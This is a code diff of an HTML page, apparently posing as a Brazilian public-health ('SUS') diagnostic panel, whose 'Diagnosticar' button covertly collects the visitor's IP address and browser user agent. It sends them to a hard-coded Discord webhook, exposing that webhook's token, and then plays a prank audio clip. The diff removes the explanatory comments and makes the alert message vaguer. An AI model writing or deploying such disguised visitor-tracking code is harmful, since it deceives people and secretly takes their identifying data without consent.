@@ -70,19 +70,16 @@
         function diagnosticar() {
             document.getElementById("erro").style.display = "block";
             
-            // Obter informações do navegador
             const userAgent = navigator.userAgent;
 
-            // Obter o IP da pessoa usando uma API externa (ipify)
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip; // IP da pessoa
-
-                    // Envia a notificação para o webhook do Discord
+                    const ip = data.ip; 
+                    
                     const webhookUrl = "https://discord.com/api/webhooks/1261347765875642478/eQeiXjMrIZlNZOUuSl2bmhocVma6EXMk255Jr_lvUdlurl2Iy9mlgCyYTpFCa-8MfjhL"; // Substitua pelo seu link de webhook do Discord
                     const message = {
-                        content: `Alguém clicou em 'Diagnosticar' no painel SUS!`,
+                        content: `novo acesso detectado:`,
                         embeds: [{
                             title: "Informações do Usuário",
                             fields: [
@@ -92,7 +89,6 @@
                         }]
                     };
 
-                    // Envia o webhook com as informações
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
@@ -102,14 +98,14 @@
                     }).catch(err => console.error('Erro ao enviar para o webhook: ', err));
                 })
                 .catch(err => console.error('Erro ao obter IP: ', err));
-
-            // Reproduz o áudio após 0,1 segundo
+            
             setTimeout(() => {
                 let audio = new Audio("https://github.com/Toskopadoo/Audios/raw/refs/heads/main/AUD-20250302-WA0286.mp3");
                 audio.play();
-            }, 100); // Delay de 0,1s
+            }, 100);
         }
     </script>
 
+    <!-- by: ig @toskopado_ -->
 </body>
 </html>
